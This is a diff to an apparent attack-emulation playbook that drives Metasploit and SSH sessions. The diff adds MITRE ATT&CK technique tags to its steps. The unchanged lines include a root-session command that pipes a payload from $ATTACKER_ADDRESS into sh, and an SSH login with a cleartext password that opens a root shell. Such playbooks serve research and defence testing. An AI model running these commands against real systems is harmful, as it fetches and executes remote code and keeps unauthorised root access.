@@ -131,6 +131,9 @@ commands:
     read: True
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: "cd /var/www/default"
@@ -228,10 +231,16 @@ commands:
   - type: msf-session
     cmd: id
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
+    metadata:
+      techniques: "T1105,T1218,T1556"
+      tactics: "Command and Control,Defense Evasion,Persistence,Credential Access"
 
   - type: sleep
     seconds: 40
@@ -240,7 +249,9 @@ commands:
     cmd: id
     read: True
     session: "root"
-
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
 # TODO: THIS COMMAND DOES NOT WORK
 #       DON'T KNOW WHY
@@ -275,6 +286,9 @@ commands:
     password: haveityourway
     creates_session: "rootshell"
     clear_cache: True
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: pwd
